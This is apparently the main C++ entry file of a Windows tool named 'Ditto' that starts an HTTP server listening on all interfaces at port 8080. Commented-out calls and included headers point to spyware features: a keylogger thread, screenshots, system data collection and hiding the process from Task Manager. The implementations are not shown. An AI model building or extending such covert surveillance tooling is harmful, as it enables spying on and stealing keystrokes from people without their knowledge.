#include "pch.h"
#include "DittoNetworksLib/WinSock.hpp"
#include "DittoNetworksLib/HttpServer.hpp"
#include "Process.hpp"
#include "WindowsException.hpp"
#include "Logger.hpp"
#include "SystemUtils.hpp"
#include "KeyLogger.hpp"
#include "BatteryUtils.hpp"
#include "SystemInfo.hpp"
#include "Screen.hpp"
#include <exception>
#include <iostream>
#include <chrono>

int main()
{
	try 
	{
		Logger::Instance().info(L"<<<<<<<<<<<<<<<<< DITTO IS RUNNING >>>>>>>>>>>>>>>>>>>");

		//Screen::instance().take_shot();

		//BatteryUtils::save_battery_info();
		//SystemInfo::save_system_info();

		//SystemUtils::get_process_id(L"");
		//SystemUtils::get_dir_list();


		//Thread key_logger_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&KeyLogger::start), nullptr };
		//KeyLogger key_logger;
		//Thread tskmgr_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&SystemUtils::hide_from_task_manager), nullptr };
		
		//tskmgr_thread.run();
		//tskmgr_thread.wait();

		WinSock winsock;
		HttpServer http_server("0.0.0.0", 8080, 10);
		http_server.serve_forever();
	}
	catch (WindowsException exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (std::exception exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (...)
	{
		std::wcout << "hey" << std::endl;
		OutputDebugString(L"Unexpected exception");
	}
}